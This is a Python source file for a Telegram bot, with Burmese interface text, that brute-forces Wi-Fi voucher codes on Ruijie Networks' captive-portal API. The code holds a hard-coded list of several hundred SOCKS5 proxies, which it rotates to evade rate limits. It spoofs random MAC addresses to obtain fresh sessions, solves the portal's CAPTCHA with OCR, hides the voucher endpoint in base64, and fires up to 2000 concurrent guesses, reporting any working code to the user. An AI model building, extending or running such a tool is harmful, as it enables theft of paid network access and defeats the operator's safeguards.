import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
from aiohttp_socks import ProxyConnector
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timezone

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

# ပေးထားသော SOCKS5 Proxy စာရင်းများ
EMBEDDED_PROXIES = [
    "8.220.141.8:5060", "8.219.5.240:8009", "8.211.194.85:443", "39.104.57.33:8081", "112.5.33.179:999",
    "39.102.208.23:8888", "8.148.23.165:9080", "47.237.2.245:3129", "72.207.109.5:4145", "8.220.204.92:30001",
    "47.109.83.196:8081", "107.181.161.81:4145", "47.91.109.17:104", "47.237.92.86:6379", "184.178.172.3:4145",
    "47.252.18.37:14186", "8.130.71.75:8119", "8.221.139.222:31433", "47.237.107.41:6379", "47.250.51.110:100",
    "47.91.89.3:8080", "47.238.130.212:443", "174.75.211.222:4145", "49.13.22.249:10806", "142.54.236.97:4145",
    "47.250.155.254:8081", "8.213.195.191:8999", "47.121.182.36:80", "107.181.168.145:4145", "184.170.249.65:4145",
    "199.187.210.54:4145", "47.119.19.221:80", "8.220.204.215:18081", "45.74.31.47:5423", "47.90.167.27:999",
    "198.8.94.174:39078", "47.250.159.65:801", "47.238.128.246:45", "8.213.128.6:5555", "47.251.87.199:8080",
    "47.252.11.233:4145", "8.148.4.166:9080", "199.102.105.242:4145", "47.92.82.167:9098", "192.252.210.233:4145",
    "47.91.121.127:3128", "149.129.255.179:1111", "74.119.144.60:4145", "184.178.172.26:4145", "47.251.73.54:64",
    "47.254.36.213:80", "68.71.252.38:4145", "72.49.49.11:31034", "8.137.38.48:8081", "104.37.135.145:4145",
    "45.74.31.40:4635", "103.236.190.197:1080", "47.91.115.179:3128", "8.210.17.35:119", "47.104.27.165:80",
    "8.219.229.53:3128", "45.74.31.47:15941", "47.92.143.92:82", "8.212.151.166:9080", "47.252.1.180:7302",
    "45.74.31.42:18800", "106.14.91.83:9098", "8.213.215.187:20002", "8.215.15.163:111", "68.71.254.6:4145",
    "47.91.120.190:8888", "47.238.60.156:81", "8.209.96.245:4153", "45.74.31.47:11302", "216.105.143.146:4145",
    "45.74.31.42:16890", "45.74.31.47:10127", "45.74.31.40:40526", "47.238.134.126:8443", "47.119.20.8:8081",
    "47.119.22.92:10000", "39.102.210.222:8080", "140.207.114.166:10080", "45.74.31.46:16241", "67.201.35.145:4145",
    "39.102.208.236:3128", "51.15.20.32:1088", "8.211.200.183:3128", "67.201.59.70:4145", "184.181.217.206:4145",
    "47.91.29.151:9091", "47.237.113.119:89", "221.225.48.84:8989", "115.29.149.2:8499", "149.129.226.9:8888",
    "89.58.42.118:3129", "129.146.121.2:10808", "149.129.226.9:1081", "47.251.87.74:85", "67.207.92.87:1088",
    "8.146.200.53:8081", "159.203.61.169:1080", "45.74.31.42:15377", "98.191.0.37:4145", "120.79.7.173:8085",
    "45.74.31.42:13853", "45.74.31.46:15496", "45.74.31.41:13319", "45.74.31.42:10641", "39.102.209.121:8008",
    "45.74.31.46:8119", "47.104.28.135:8080", "192.252.220.92:17328", "111.206.4.163:18888", "47.251.74.38:8009",
    "39.104.16.201:3128", "47.87.97.94:1080", "216.105.130.131:4145", "184.178.172.28:15294", "45.74.31.42:16860",
    "47.250.11.111:161", "47.76.144.139:6379", "101.200.158.109:8008", "45.74.31.46:10232", "45.74.31.46:5363",
    "45.74.31.42:9299", "142.54.237.34:4145", "72.205.0.67:4145", "104.200.152.30:4145", "45.74.31.46:11299",
    "192.252.209.158:4145", "47.92.194.235:9080", "121.43.154.123:9080", "45.74.31.42:5323", "193.23.219.115:1080",
    "47.92.194.235:1080", "45.74.31.46:7361", "192.111.134.10:4145", "47.100.130.127:3129", "39.102.208.149:4000",
    "39.102.211.162:8090", "68.71.242.118:4145", "47.91.110.148:55443", "167.86.79.35:1080", "45.90.217.190:1085",
    "198.8.84.3:4145", "184.185.2.12:4145", "192.252.215.5:16137", "45.74.31.47:8849", "8.215.3.250:1080",
    "62.83.34.101:1080", "142.54.232.6:4145", "45.74.31.40:7766", "45.74.31.42:11822", "47.121.183.107:6379",
    "45.74.31.42:15723", "8.215.3.250:8888", "72.195.34.35:27360", "45.74.31.41:7212", "192.252.211.197:14921",
    "8.137.62.53:8008", "45.74.31.42:9937", "39.102.211.64:3128", "39.102.210.176:10002", "68.71.249.153:48606",
    "70.166.167.38:57728", "45.79.221.107:1080", "199.102.104.70:4145", "8.130.37.235:8081", "198.8.94.170:4145",
    "128.199.202.122:1080", "130.162.144.61:1080", "110.38.233.122:1080", "8.148.22.214:8080", "157.10.243.18:1080",
    "39.104.59.56:9080", "8.130.90.177:9098", "45.74.31.47:25026", "192.252.214.20:15864", "45.74.31.42:11978",
    "45.74.31.42:9590", "45.74.31.42:39556", "45.61.129.165:9050", "39.102.209.163:80", "184.178.172.11:4145",
    "203.189.135.140:1080", "45.74.31.46:7820", "45.74.31.42:6426", "45.74.31.41:12136", "45.149.92.160:1080",
    "192.252.215.2:4145", "184.181.178.33:4145", "45.74.31.42:6554", "192.111.130.5:17002", "142.54.235.9:4145",
    "45.74.31.42:15534", "47.104.27.249:3128", "45.74.31.46:9791", "199.66.183.226:4145", "45.74.31.47:8210",
    "98.182.147.97:4145", "45.74.31.42:15289", "192.111.129.145:16894", "98.170.57.241:4145", "68.71.240.210:4145",
    "192.111.129.150:4145", "68.71.249.158:4145", "68.71.241.33:4145", "45.74.31.46:5666", "192.111.138.29:4145",
    "47.121.133.212:4006", "132.243.168.30:9150", "47.238.126.208:1080", "47.91.107.139:8118", "161.35.70.249:1080",
    "198.199.86.11:1080", "101.32.213.44:1080", "45.74.31.42:20738", "139.224.186.221:8182", "192.111.135.17:18302",
    "38.18.230.153:8888", "142.54.239.1:4145", "74.119.147.209:4145", "174.77.111.197:4145", "72.37.217.3:4145",
    "72.206.74.126:4145", "114.215.127.92:8081", "45.74.31.42:6849", "184.170.251.30:11288", "68.71.247.130:4145",
    "45.74.31.41:4178", "174.75.211.193:4145", "45.74.31.46:4236", "47.245.34.161:5566", "47.116.181.146:3128",
    "184.178.172.13:15311", "47.119.164.33:2080", "8.134.139.219:1337", "68.71.245.206:4145", "8.130.36.163:5000",
    "8.219.94.23:7890", "209.97.150.167:1080", "47.92.152.43:8008", "8.208.90.194:8088", "103.100.158.115:10809",
    "142.54.228.193:4145", "72.37.216.68:4145", "192.252.216.86:4145", "45.74.31.41:14503", "47.121.129.129:6666",
    "45.74.31.46:13410", "103.74.103.37:1080", "199.229.254.129:4145", "68.71.251.134:4145", "199.116.112.6:4145",
    "158.220.101.43:1080", "39.104.26.204:21025", "134.209.29.120:1080", "91.107.247.193:7001", "47.119.164.33:8090",
    "70.166.65.160:4145", "45.194.33.12:30002", "49.13.150.79:9050", "45.74.31.47:11489", "45.74.31.41:39563",
    "72.195.34.60:27391", "45.74.31.46:14619", "45.74.31.42:20830", "45.74.31.42:10442", "39.102.213.50:80",
    "45.74.31.40:14200", "45.74.31.42:20235", "39.102.209.128:10000", "45.74.31.40:26696", "47.243.242.70:8192",
    "45.74.31.47:5821", "47.253.71.33:55443", "187.127.140.233:1080", "192.111.139.162:4145", "45.74.31.42:32289",
    "72.195.114.169:4145", "8.130.210.249:8889", "45.74.31.42:21229", "184.178.172.5:15303", "143.198.90.221:1088",
    "152.67.22.144:1080", "216.105.128.144:4145", "123.58.219.171:10808", "45.194.33.12:30001", "142.54.237.38:4145",
    "192.252.211.193:4145", "192.252.209.155:14455", "45.74.31.46:9434", "72.195.34.42:4145", "45.74.31.41:29694",
    "45.74.31.47:4297", "70.166.167.55:57745", "47.245.165.201:1080", "45.74.31.47:7202", "67.201.58.190:4145",
    "52.128.241.108:1080", "199.66.182.243:4145", "45.74.31.41:8079", "98.175.31.195:4145", "45.74.31.41:16089",
    "144.24.111.128:1088", "174.64.199.79:4145", "67.201.39.14:4145", "184.178.172.17:4145", "98.181.137.80:4145",
    "39.104.89.111:8058", "192.111.139.165:4145", "68.1.210.163:4145", "107.174.30.92:1080", "184.178.172.18:15280",
    "45.74.31.42:12497", "45.74.31.46:14000", "139.59.1.14:1080", "192.252.220.89:4145", "47.109.52.147:8088",
    "184.181.217.210:4145", "149.248.18.106:1081", "184.170.248.5:4145", "8.137.13.191:3128", "45.74.31.42:15370",
    "45.74.31.46:4952", "45.74.31.46:10006", "174.77.111.196:4145", "107.152.98.5:4145", "45.74.31.40:7380",
    "192.252.216.81:4145", "47.119.22.156:9080", "39.100.88.89:8081", "45.74.31.47:7118", "47.88.11.3:3129",
    "45.74.31.42:13284", "45.74.31.42:15045", "98.178.72.30:4145", "159.65.105.142:1080", "72.195.34.58:4145",
    "68.71.243.14:4145", "175.27.252.26:1080", "208.102.51.6:58208", "45.74.31.46:16230", "192.252.208.67:14287",
    "142.54.231.38:4145", "98.175.31.222:4145", "156.239.53.19:1080", "199.116.114.11:4145", "72.205.0.93:4145",
    "49.0.246.130:443", "47.106.75.125:2000", "45.74.31.46:7283", "184.181.217.213:4145", "45.74.31.42:16772",
    "138.68.60.8:1080", "155.103.158.243:1080", "98.191.0.47:4145", "98.181.137.83:4145", "45.74.31.47:10228",
    "160.187.0.89:1080", "43.245.199.34:1080", "199.66.182.232:4145", "45.74.31.40:11542", "45.74.31.42:8640",
    "162.253.68.97:4145", "195.135.255.98:1080", "45.74.31.46:7921", "199.58.185.9:4145", "182.163.96.66:1080",
    "192.252.214.17:4145", "45.74.31.40:5301", "45.74.31.47:8054", "45.74.31.40:6168", "45.74.31.41:17186",
    "113.22.224.63:1083", "103.206.68.241:1080", "202.4.116.146:9090", "45.74.31.42:16537", "142.54.229.249:4145",
    "45.74.31.47:17420", "174.77.111.198:49547", "118.107.1.232:11080", "45.74.31.40:16051", "45.74.31.47:26212",
    "45.74.31.47:8392", "45.74.31.42:10177", "123.113.129.17:1081", "38.76.212.39:8181", "199.66.183.251:4145",
    "45.74.31.46:7964", "104.200.135.46:4145", "45.74.31.46:12402", "45.74.31.46:15920", "45.74.31.46:10001",
    "45.74.31.41:9995", "45.74.31.46:4441", "184.178.172.23:4145", "142.54.226.214:4145", "206.220.175.2:4145",
    "98.170.57.231:4145", "72.214.108.67:4145", "45.74.31.46:8594", "45.74.31.46:10890"
]

bot = AsyncTeleBot(BOT_TOKEN)
_telegram_send = bot.send_message
_telegram_reply = bot.reply_to
_telegram_edit = bot.edit_message_text
user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
retry_counts = {}

session = None
_connector = None
_voucher_sem = None

CONCURRENCY = 2000

def get_random_proxy():
    if not EMBEDDED_PROXIES:
        return None
    return f"socks5://{random.choice(EMBEDDED_PROXIES)}"

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def safe_send_message(chat_id, text, **kwargs):
    for _ in range(3):
        try:
            return await _telegram_send(chat_id, text, **kwargs)
        except Exception:
            await asyncio.sleep(1)

async def safe_edit_message_text(chat_id, message_id, text, **kwargs):
    for _ in range(3):
        try:
            return await _telegram_edit(chat_id=chat_id, message_id=message_id, text=text, **kwargs)
        except Exception:
            await asyncio.sleep(1)

bot.send_message = safe_send_message
bot.edit_message_text = safe_edit_message_text

@bot.message_handler(commands=['start', 'help'])
async def start(message):
    await bot.reply_to(
        message,
        f"✨ <b>Ruijie Voucher Bot (SOCKS5 Rotating)</b> မှ ကြိုဆိုပါတယ် ဗျာ! ⚡\n\n"
        f"🌐 <b>Proxy Status:</b> <code>Active ({len(EMBEDDED_PROXIES)} SOCKS5 Proxies Loaded)</code>\n\n"
        "📖 <b>အသုံးပြုနိုင်သော Commands များ:</b>\n"
        "• <code>/input your_wifidog_url</code> - Wifidog Session URL ထည့်ရန်\n"
        "• <code>/scan 6</code> (သို့မဟုတ် <code>7</code>, <code>all</code>) - စကန်ဖတ်ရန်\n"
        "• <code>/status</code> - လက်ရှိအခြေအနေ ကြည့်ရန်\n"
        "• <code>/stop</code> - စကန်ဖတ်ခြင်း ရပ်တန့်ရန်",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['status'])
async def status_cmd(message):
    chat_id = message.chat.id
    active = "အလုပ်လုပ်နေသည် 🟢" if chat_id in scan_tasks else "ရပ်နားထားသည် 🔴"
    await bot.reply_to(
        message,
        f"📊 <b>လက်ရှိ Bot အခြေအနေ:</b>\n• Status: {active}\n• Active Scans: {len(scan_tasks)}\n• SOCKS5 Proxies: {len(EMBEDDED_PROXIES)} Loaded",
        parse_mode="HTML"
    )

async def check_session_url(session_url):
    try:
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        proxy_str = get_random_proxy()
        connector = ProxyConnector.from_url(proxy_str) if proxy_str else None
        async with aiohttp.ClientSession(connector=connector) as temp_sess:
            async with temp_sess.get(session_url, allow_redirects=True, headers=headers) as response:
                final_url = str(response.url)
                body = await response.text()
                return "sessionId" in final_url or "sessionId" in body or response.status in (200, 302, 301)
    except Exception:
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/input your_wifidog_url</code>", parse_mode="HTML")
        return
    url = args[1]
    user_data.setdefault(chat_id, {})
    await bot.reply_to(message, "🔄 Wifidog Session URL အား SOCKS5 Proxy ဖြင့် စစ်ဆေးနေပါပြီ ⏳...")
    if await check_session_url(session_url=url):
        user_data[chat_id]['session_url'] = url
        await bot.reply_to(message, "✅ Session URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ 🎉! /scan ဖြင့် စတင်နိုင်ပါပြီ။")
    else:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည် သို့မဟုတ် သက်တမ်းကုန်သွားပါပြီ။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/scan [6, 7, 8, ascii-lower, all]</code>", parse_mode="HTML")
        return
    mode = args[1]
    chat_id = message.chat.id
    if mode not in {"6", "7", "8", "all", "ascii-lower"}:
        await bot.reply_to(message, "❌ Mode သည် 6, 7, 8, all, ascii-lower ထဲမှ တစ်ခုဖြစ်ရပါမည်။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "⚠️ ပထမဦးစွာ <code>/input</code> ဖြင့် Session URL ထည့်သွင်းပေးပါရန်။", parse_mode="HTML")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ စကန်ဖတ်ခြင်း လုပ်ငန်းစဉ်သည် လက်ရှိတွင် အလုပ်လုပ်နေဆဲ ဖြစ်ပါသည်။")
        return

    progress_msg = await safe_send_message(chat_id, "🚀 SOCKS5 Proxy Rotating ဖြင့် စကန်ဖတ်ခြင်း စတင်နေပါပြီ ⚡...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg)
    )

    scan_tasks[chat_id] = {
        "task": task, "stop": False, "scan_id": scan_id,
        "checked": 0, "total": None, "speed": 0, "found": 0,
        "retries": 0, "start_time": time.monotonic(), "mode": mode
    }

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "🛑 စကန်ဖတ်ခြင်း လုပ်ငန်းစဉ်ကို ရပ်တန့်လိုက်ပါပြီ။")
    else:
        await bot.reply_to(message, "⚠️ လက်ရှိ လုပ်ဆောင်နေသော စကန်ဖတ်မှု မရှိပါ။")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        total = 10 ** length
        start = random.randrange(total)
        step = random.randrange(1, total, 2)
        while step % 5 == 0:
            step = random.randrange(1, total, 2)
        for offset in range(total):
            yield str((start + offset * step) % total).zfill(length)
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError("Unsupported mode")

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except Exception:
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    pending = set()
    last_update = time.monotonic()

    async def _check(code):
        async with _voucher_sem:
            return await perform_check(session_url, code, chat_id, message=message)

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 2.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        retries = retry_counts.get(chat_id, 0)
        percent = (checked / total) * 100 if total else 0
        bar = ("█" * min(20, int(percent / 5))) + ("░" * (20 - min(20, int(percent / 5))))
        text = f"🚀 <b>SOCKS5 Proxy Scanning...</b> 🔄\n\n📦 Checked: {checked:,}" + (f"/{total:,}" if total else "") + f"\n⚡ Speed: {speed:,.0f} codes/min\n✅ Found: {found}\n" + (f"[{bar}]" if total else "")
        try:
            await safe_edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML")
        except Exception:
            pass

    try:
        for code in code_iter:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("stop"):
                break
            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)
            if len(pending) >= CONCURRENCY:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
                await _flush_progress()
        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)
    finally:
        for t in pending:
            t.cancel()
        scan_tasks.pop(chat_id, None)

async def get_session_id(session_url, proxy_str, previous_session_id=None):
    mac = ':'.join(f'{random.choice([0x02, 0x06, 0x0A, 0x0E]):02x}' for _ in range(1)) + ''.join(f':{random.randint(0,255):02x}' for _ in range(5))
    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    connector = ProxyConnector.from_url(proxy_str) if proxy_str else None
    try:
        async with aiohttp.ClientSession(connector=connector) as temp_sess:
            async with temp_sess.get(session_url, allow_redirects=True) as req:
                match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
                if match:
                    return match.group(1)
                body = await req.text()
                match_body = re.search(r"sessionId=([a-zA-Z0-9]+)", body)
                return match_body.group(1) if match_body else previous_session_id
    except Exception:
        return previous_session_id

_ocr = ddddocr.DdddOcr(show_ad=False)
_executor = concurrent.futures.ThreadPoolExecutor(max_workers=4)

async def perform_check(session_url, code, chat_id, message=None):
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    loop = asyncio.get_running_loop()
    proxy_str = get_random_proxy()
    connector = ProxyConnector.from_url(proxy_str) if proxy_str else None

    for _attempt in range(2):
        try:
            callback_session_id = await get_session_id(session_url, proxy_str)
            if not callback_session_id:
                return
            async with aiohttp.ClientSession(connector=connector) as req_sess:
                async with req_sess.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={callback_session_id}&_t={time.time()}') as img:
                    img_bytes = await img.read()
                
                ocr_text = await loop.run_in_executor(_executor, _ocr.classification, img_bytes)
                ocr_text = ocr_text.upper()

                async with req_sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': callback_session_id, 'authCode': ocr_text}) as verify:
                    v_data = await verify.json()
                    if not v_data.get("success"):
                        continue

                async with req_sess.post(post_url, json={"accessCode": code, "sessionId": callback_session_id, "apiVersion": 1, "authCode": ocr_text}) as req:
                    response = await req.text()
                    if req.status in (401, 403):
                        return
                    if response and 'logonUrl' in response:
                        if chat_id not in success_texts:
                            success_texts[chat_id] = []
                        success_texts[chat_id].append(code)
                        if message:
                            try:
                                await safe_send_message(message.chat.id, f"🎉 <b>Success Code Found!</b>\n\n🎫 Code: <code>{code}</code>", parse_mode="HTML")
                            except Exception:
                                pass
                    return
        except Exception:
            return

async def start_polling():
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
        except Exception:
            await asyncio.sleep(5)

async def main():
    await asyncio.gather(web_server(), start_polling())

if __name__ == '__main__':
    asyncio.run(main())
